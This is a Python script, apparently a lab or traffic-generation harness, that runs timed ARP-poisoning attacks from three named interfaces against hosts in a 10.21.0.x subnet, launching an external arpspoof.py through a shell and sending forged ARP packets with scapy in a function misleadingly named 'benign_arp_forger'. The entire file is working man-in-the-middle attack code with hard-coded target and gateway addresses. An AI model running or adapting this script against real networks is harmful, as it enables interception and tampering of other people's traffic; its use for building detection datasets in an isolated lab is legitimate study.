import subprocess
import threading
import random
import time
import sys
import signal
import os
from scapy.all import *
from datetime import datetime, timedelta

run_time_minutes = 10

INTERFACES = ['Melchior', 'Balthasar', 'Casper']
TARGET_INTERFACES = ['Maria', 'Rose', 'Sina']

# Data structure for agents
agents_info = {
    'Melchior': 'F6:91:7F:74:12:F6',
    'Balthasar': 'F2:C7:F1:B6:80:98',
    'Casper': 'B2:DE:93:F3:CD:F8'
}

# Data structure for targets
targets_info = {
    'Maria': {'target_ip':'10.21.0.16','target_mac':'CE:32:51:9F:81:02'},
    'Rose':  {'target_ip':'10.21.0.17','target_mac':'12:45:6C:CD:58:D6'},
    'Sina':  {'target_ip':'10.21.0.18','target_mac':'B2:DA:BF:0C:ED:AB'}
}

# Number of agents
num_agents = len(INTERFACES)

# Lock for the availability of interfaces
interface_lock = [threading.Lock() for _ in range(num_agents)]

# Function to simulate code execution on an interface

def execute_code(agent_id, target_interface): # ARP-poison script: https://github.com/EONRaider/Arp-Spoofer
    agent_name = INTERFACES[agent_id]
    agent_interface_mac = agents_info[agent_name]

    targetip = targets_info[target_interface]['target_ip']
    targetmac = targets_info[target_interface]['target_mac']

    with interface_lock[agent_id]:
        print(f"Agent {agent_name} ({agent_id}) is executing code on {target_interface}.")
        print(f"Agent {agent_name}'s Interface MAC: {agent_interface_mac}")

        # Generate a random duration between 2 to 4 minutes
        duration = random.uniform(2, 4)
        end_time = datetime.now() + timedelta(minutes=duration)
        print(end_time)


        command = [f'python3 arpspoof.py --targetip {targetip} -i {agent_name} --attackermac {agent_interface_mac} --targetmac {targetmac} --gatewaymac DE:BC:50:A7:AD:9E -f']

        try:
            print(f"Agent {agent_name} is running the following command: {' '.join(command)}")
            print(datetime.now())
            process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)

        except subprocess.CalledProcessError as e:
            print(f"Agent {agent_name} failed to execute the command: {' '.join(command)}")
            print(f"Error: {e}")
            # Handle the failure here
    
        # Run the loop until the specified end time
        while True :
            if datetime.now() >= end_time:
                print(f"Agent {agent_name} finished executing code on {target_interface}.")
                os.killpg(os.getpgid(process.pid),signal.SIGTERM)
                return

def benign_arp_forger(agent_name, target_interface):

    targetip = targets_info[target_interface]['target_ip']
    targetmac = targets_info[target_interface]['target_mac']
    
    arppkt = Ether()/ARP()
    arppkt[ARP].hwsrc = targetmac
    arppkt[ARP].psrc = targetip
    arppkt[ARP].pdst = "10.21.0.5"
    arppkt[Ether].hwdst = "DE:BC:50:A7:AD:9E"
    sendp(arppkt, iface="eth0", verbose=0)
    print(f"{agent_name}sending forged arp packet to {target_interface}")


# Function to run an agent
def run_agent(agent_id):
    agent_name = INTERFACES[agent_id]
    prev_target_interface = None
    while True:
        duration = random.uniform(2, 4)
        end_time = datetime.now() + timedelta(minutes=duration)

        # Choose a random target interface
        target_interface = random.choice(TARGET_INTERFACES)

        # Remove the used target interface
        TARGET_INTERFACES.remove(target_interface)

        # Execute code on the chosen interface
        execute_code(agent_id, target_interface)

        while  datetime.now() < end_time:
            benign_arp_forger(agent_name, target_interface)
            time.sleep(30)
        print(f"Agent {agent_name} finished forgeing arp packets on {prev_target_interface}.")
        
        # Append the target interface back
        TARGET_INTERFACES.append(target_interface)


# Main function
def main():
    # Create and start threads for each agent
    threads = []
    for agent_id in range(num_agents):
        thread = threading.Thread(target=run_agent, args=(agent_id,))
        threads.append(thread)
        thread.start()

    try:
        # Run the agents for an hour
        time.sleep(60 * run_time_minutes)
        print("Time's up! Stopping agents...")

        sys.exit()
    except KeyboardInterrupt:
        print("\nReceived KeyboardInterrupt. Stopping agents...")
        sys.exit()


# Entry point
if __name__ == "__main__":
    main()
